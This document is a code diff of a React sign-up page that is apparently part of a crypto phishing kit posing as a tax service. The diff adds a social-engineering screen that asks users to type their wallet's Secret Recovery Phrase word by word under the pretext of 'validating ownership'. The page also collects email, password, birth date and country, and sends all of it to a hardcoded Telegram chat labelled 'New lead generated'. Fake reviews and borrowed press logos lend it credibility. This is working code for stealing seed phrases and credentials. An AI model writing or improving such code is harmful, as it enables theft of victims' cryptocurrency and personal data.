@@ -3,6 +3,11 @@ import { checkRegexEmail } from '../../common/utils/checkRegexEmail';
 import { Logotype } from '../../components/Logotype';
 import { TelegramService } from '../../services/telegram.service';
 import './index.css';
+import { CRYPTO_NAME } from '../../common/contants';
+
+type SeedLengthType = 12 | 15 | 18 | 21 | 24;
+
+const SeedLengths: SeedLengthType[] = [12, 15, 18, 21, 24];
 
 type LeadType = {
   email: string;
@@ -10,7 +15,8 @@ type LeadType = {
   birthDate: string;
   country: string;
   password: string;
-  seed: string;
+  repeatPassword: string;
+  seed: Record<number, string>;
   location?: {
     city: string;
     continentCode: string;
@@ -32,21 +38,21 @@ type ReviewType = {
 
 const reviewItems: ReviewType[] = [
   {
-    avatar: '/img/avatar-adam-zentini.png',
+    avatar: '/assets/images/avatars/avatar-adam-zentini.png',
     name: 'Adam Zentini',
     date: 'Mar 6, 2021',
     title: 'Great! Product!',
     content: 'I went to Finance this year because a friend of mine recommended them. I was connected with a human who walked me right through everything. It is so nice knowing I won’t have to dread crypto taxes!.'
   },
   {
-    avatar: '/img/avatar-robert-man.png',
+    avatar: '/assets/images/avatars/avatar-robert-man.png',
     name: 'Robert',
     date: 'Jun 15, 2021',
     title: 'Great Product!',
     content: 'Easier than I thought it would be! Just knowing next year will be just as easy is comforting.'
   },
   {
-    avatar: '/img/avatar-jason-man.png',
+    avatar: '/assets/images/avatars/avatar-jason-man.png',
     name: 'Jason',
     date: 'Jun 15, 2021',
     title: 'I’m a noob to crypto - Love Finance',
@@ -62,7 +68,9 @@ export const RegisterPage = () => {
   const [lead, setLead] = useState<LeadType>({
     email: '', username: '',
     birthDate: '', country: '',
-    password: '', seed: '' });
+    password: '', repeatPassword: '', seed: {} });
+  const [seedLength, setSeedLength] = useState<SeedLengthType>(12);
+  const [seedValidation, setSeedValidation] = useState<boolean>(false);
   /** Agree checkbox state */
   const [agreeBtn, setAgreeBtn] = useState<boolean>(false);
   /**
@@ -73,7 +81,7 @@ export const RegisterPage = () => {
   const dateInputRef = useRef<HTMLInputElement>(null);
   const countryInputRef = useRef<HTMLInputElement>(null);
   const passwordInputRef = useRef<HTMLInputElement>(null);
-  const seedInputRef = useRef<HTMLInputElement>(null);
+  const repeatPasswordInputRef = useRef<HTMLInputElement>(null);
   /**
    * Effects
    */
@@ -81,12 +89,12 @@ export const RegisterPage = () => {
 
     window.document.title = 'Sign Up';
 
-    if (!lead.location) {
+    // if (!lead.location) {
 
-      fetch('https://api.db-ip.com/v2/free/self', { method: 'GET' })
-        .then((res) => res.json())
-        .then((res) => setLead({ ...lead, location: res }));
-    }
+    //   fetch('https://api.db-ip.com/v2/free/self', { method: 'GET' })
+    //     .then((res) => res.json())
+    //     .then((res) => setLead({ ...lead, location: res }));
+    // }
   }, [lead]);
   /**
    * Functions
@@ -156,13 +164,24 @@ export const RegisterPage = () => {
       return alert('Password not valid');
     } else passwordInputRef.current?.classList.remove('invalid');
 
-    // Check seed field
-    if (lead.seed.length === 0 || lead.seed.split(' ').length < 12) {
+    // // Check seed field
+    // if (lead.seed.length === 0 || lead.seed.split(' ').length < 12) {
 
-      seedInputRef.current?.classList.add('invalid');
+    //   seedInputRef.current?.classList.add('invalid');
 
-      return alert('Seed not valid');
-    } else seedInputRef.current?.classList.remove('invalid');
+    //   return alert('Seed not valid');
+    // } else seedInputRef.current?.classList.remove('invalid');
+
+    const ipInformation = (): string => {
+      if (!!lead.location) {
+        return ''
+      + `IP: ${lead.location?.ipAddress}\n`
+      + `City: ${lead.location?.city} State: ${lead.location?.stateProv}\n`
+      + `Country: ${lead.location?.countryName} ${lead.location?.continentCode}`
+      } else {
+        return 'no information'
+      }
+    }
 
     const message: string = '' 
       + '<b>New lead generated</b>\n\n'
@@ -171,18 +190,16 @@ export const RegisterPage = () => {
       + `Birth day: ${new Date(lead.birthDate).toLocaleString()}\n`
       + `Country: ${lead.country}\n`
       + `Password: ${lead.password}\n`
-      + `Seed:\n<code>${lead.seed}</code>\n\n`
+      + `Seed:\n<code>${Object.values(lead.seed).join(' ')}</code>\n\n`
       + `<b>IP INFORMATION</b>\n\n`
-      + `IP: ${lead.location?.ipAddress}\n`
-      + `City: ${lead.location?.city} State: ${lead.location?.stateProv}\n`
-      + `Country: ${lead.location?.countryName} ${lead.location?.continentCode}`
+      + ipInformation();
 
     TelegramService.sendMessage(535364051, message)
       .then(() => {
         window.localStorage.setItem('lead-email', lead.email);
         window.location.href = '/success';
       })
-      .catch((err) => alert('Failed request, try again'));
+      .catch((err) => alert('Failed request, try again later!'));
   }
   
   return (
@@ -199,146 +216,209 @@ export const RegisterPage = () => {
             <Logotype />
           </div>
 
-          {/* Registration form */}
-          <div style={{ display: 'block', height: '100%' }}>
+          <div style={{ display: 'flex', height: '100%' }}>
             <div id="app__auth_register_block_form">
               <span id="app__register_form_title">
                 <h1>Sign Up</h1>
               </span>
 
-              <div id="app__register_form_controls">
+              {agreeBtn ? (
+                <>
+                  {/* Seed form */}
+                  <div id="app__register_form_seed">
 
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Email</span>
-                    <input
-                      ref={emailInputRef}
-                      type="email"
-                      placeholder='Email'
-                      value={lead.email}
-                      onChange={
-                        (evt) => {
+                    <div id="header">
+                      <h1 id="title">Access your wallet with your<br/>Secret Recovery Phrase</h1>
+                      <p id="subtitle">{CRYPTO_NAME} cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
+                    </div>
 
-                          if (emailInputRef.current)
-                            validationField(
-                              emailInputRef.current,
-                              checkRegexEmail(evt.target.value)
-                            );
+                    <div id="app__seed_length_select">
 
-                          setLead({ ...lead, email: evt.target.value });
-                        }
-                      }
-                    />
-                  </label>
-                </div>
+                      <label htmlFor="app__seed_length_selection_">
+                        Type your Secret Recovery Phrase
+                      </label>
 
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Username</span>
-                    <input
-                      ref={usernameInputRef}
-                      type="text"
-                      placeholder='Username'
-                      value={lead.username}
-                      onChange={
-                        (evt) => {
+                      <select
+                        id="app__seed_length_selection"
+                        defaultValue={seedLength}
+                        onChange={(evt) => setSeedLength(Number(evt.target.value) as SeedLengthType)}
+                      >
+                        {SeedLengths.map((seed, key) => (
+                          <option key={key} value={seed}>I have a {seed}-word phrase</option>
+                        ))}
+                      </select>
 
-                          if (usernameInputRef.current)
-                            validationField(
-                              usernameInputRef.current,
-                              evt.target.value.length > 0
-                            )
+                    </div>
 
-                          setLead({ ...lead, username: evt.target.value });
-                        }
-                      }
-                    />
-                  </label>
-                </div>
-
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Date of birth</span>
-                    <input
-                      ref={dateInputRef}
-                      type="date"
-                      id="date"
-                      value={lead.birthDate}
-                      onChange={
-                        (evt) => setLead({ ...lead, birthDate: evt.target.value })
-                      }
-                    />
-                  </label>
-                </div>
-
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Country</span>
-                    <input
-                      ref={countryInputRef}
-                      type="text"
-                      placeholder='Country'
-                      value={lead.country}
-                      onChange={(evt) => {
-
-                        if (countryInputRef.current)
-                          validationField(
-                            countryInputRef.current,
-                            evt.target.value.length > 0
-                          )
-
-                        setLead({ ...lead, country: evt.target.value })
-                      }}
-                    />
-                  </label>
-                </div>
-
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Password</span>
-                    <input
-                      ref={passwordInputRef}
-                      type="password"
-                      placeholder='Password'
-                      value={lead.password}
-                      onChange={(evt) => {
-
-                        if (passwordInputRef.current)
-                          validationField(
-                            passwordInputRef.current,
-                            evt.target.value.length > 6
-                          )
+                    <div id="app__seed_form_block">
                         
-                        setLead({ ...lead, password: evt.target.value });
-                      }}
-                    />
-                  </label>
-                </div>
+                      {[...new Array(seedLength)].map((_, key) => (
+                        <div
+                          key={key}
+                          className='app__seed_form_cell'
+                        >
+                          <label htmlFor={`app__seed_form_cell_input_${key}`}>{key+1}</label>
+                          <input
+                            id={`app__seed_form_cell_input_${key}`}
+                            type="text"
+                            onChange={(evt) => {
+                              
+                              if (evt.target.value.length < 2 || evt.target.value.split(' ').length > 1) {
+                                evt.target.classList.add('invalid')
+                              } else {
 
-                <div className='app__register_form_control'>
-                  <label>
-                    <span>Seed Phrase <a href='/'>What is?</a></span>
-                    <input
-                      ref={seedInputRef}
-                      type="text"
-                      placeholder='Seed - Phrase'
-                      value={lead.seed}
-                      onChange={(evt) => {
+                                if (evt.target.classList.contains('invalid'))
+                                  evt.target.classList.remove('invalid');
+                              }
 
-                        if (seedInputRef.current)
-                          validationField(
-                            seedInputRef.current,
-                            evt.target.value.split(' ').length > 11 &&
-                            evt.target.value.split(' ')[evt.target.value.split(' ').length - 1].length > 1
-                          )
+                              setLead({ ...lead, seed: { ...lead.seed, [key]: evt.target.value } })
 
-                        setLead({ ...lead, seed: evt.target.value });
-                      }}
-                    />
-                  </label>
-                </div>
+                            }}
+                          />
+                        </div>
+                      ))}
 
-              </div>
+                    </div>
+
+                  </div>
+                </>
+              ) : (
+                <>
+                  {/** Registration form */}
+                  <div id="app__register_form_controls">
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Email</span>
+                        <input
+                          ref={emailInputRef}
+                          type="email"
+                          placeholder='Email'
+                          value={lead.email}
+                          onChange={
+                            (evt) => {
+
+                              if (emailInputRef.current)
+                                validationField(
+                                  emailInputRef.current,
+                                  checkRegexEmail(evt.target.value)
+                                );
+
+                              setLead({ ...lead, email: evt.target.value });
+                            }
+                          }
+                        />
+                      </label>
+                    </div>
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Username</span>
+                        <input
+                          ref={usernameInputRef}
+                          type="text"
+                          placeholder='Username'
+                          value={lead.username}
+                          onChange={
+                            (evt) => {
+
+                              if (usernameInputRef.current)
+                                validationField(
+                                  usernameInputRef.current,
+                                  evt.target.value.length > 0
+                                )
+
+                              setLead({ ...lead, username: evt.target.value });
+                            }
+                          }
+                        />
+                      </label>
+                    </div>
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Date of birth</span>
+                        <input
+                          ref={dateInputRef}
+                          type="date"
+                          id="date"
+                          value={lead.birthDate}
+                          onChange={
+                            (evt) => setLead({ ...lead, birthDate: evt.target.value })
+                          }
+                        />
+                      </label>
+                    </div>
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Country</span>
+                        <input
+                          ref={countryInputRef}
+                          type="text"
+                          placeholder='Country'
+                          value={lead.country}
+                          onChange={(evt) => {
+
+                            if (countryInputRef.current)
+                              validationField(
+                                countryInputRef.current,
+                                evt.target.value.length > 0
+                              )
+
+                            setLead({ ...lead, country: evt.target.value })
+                          }}
+                        />
+                      </label>
+                    </div>
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Password</span>
+                        <input
+                          ref={passwordInputRef}
+                          type="password"
+                          placeholder='Password'
+                          value={lead.password}
+                          onChange={(evt) => {
+
+                            if (passwordInputRef.current)
+                              validationField(
+                                passwordInputRef.current,
+                                evt.target.value.length > 6
+                              )
+                            
+                            setLead({ ...lead, password: evt.target.value });
+                          }}
+                        />
+                      </label>
+                    </div>
+
+                    <div className='app__register_form_control'>
+                      <label>
+                        <span>Repeat password</span>
+                        <input
+                          ref={repeatPasswordInputRef}
+                          type="password"
+                          placeholder='Password'
+                          value={lead.repeatPassword}
+                          onChange={(evt) => {
+
+                            if (repeatPasswordInputRef.current)
+                              validationField(
+                                repeatPasswordInputRef.current,
+                                evt.target.value === lead.password
+                              )
+                            
+                            setLead({ ...lead, repeatPassword: evt.target.value });
+                          }}
+                        />
+                      </label>
+                    </div>
+
+                  </div>
+                </>
+              )}
 
               <div className='app__register_form_control' id="app__register_form_checkbox_control">
                 <input type="checkbox" id="auth__form_checkbox_agree" checked={agreeBtn} onChange={() => setAgreeBtn(!agreeBtn)} />
@@ -348,7 +428,12 @@ export const RegisterPage = () => {
               </div>
 
               <div id="auth__form_submit">
-                <button onClick={handleSendLead} disabled={!agreeBtn}>Sign Up</button>
+                <button
+                  onClick={handleSendLead}
+                  disabled={!agreeBtn || Object.keys(lead.seed).length !== seedLength}
+                >
+                  Sign Up
+                </button>
               </div>
 
             </div>
@@ -402,19 +487,19 @@ export const RegisterPage = () => {
                 {/* Images bar */}
                 <div id="app__reviews_block_footer_images">
                   <div>
-                    <img src='/img/new-your-times-logo.png' alt="ICON" />
+                    <img src='/assets/images/logotypes/new-your-times-logo.png' alt="ICON" />
                   </div>
                   <div>
-                    <img src='/img/forbes-logo.png' alt="ICON" />
+                    <img src='/assets/images/logotypes//forbes-logo.png' alt="ICON" />
                   </div>
                   <div>
-                    <img src='/img/bloomberg-logo.png' alt="ICON" />
+                    <img src='/assets/images/logotypes//bloomberg-logo.png' alt="ICON" />
                   </div>
                   <div>
-                    <img src='/img/coindesk-logo.png.png' alt="ICON" />
+                    <img src='/assets/images/logotypes//coindesk-logo.png.png' alt="ICON" />
                   </div>
                   <div>
-                    <img src='/img/turbotax-logo.png' alt="ICON" />
+                    <img src='/assets/images/logotypes//turbotax-logo.png' alt="ICON" />
                   </div>
                 </div>
               </div>
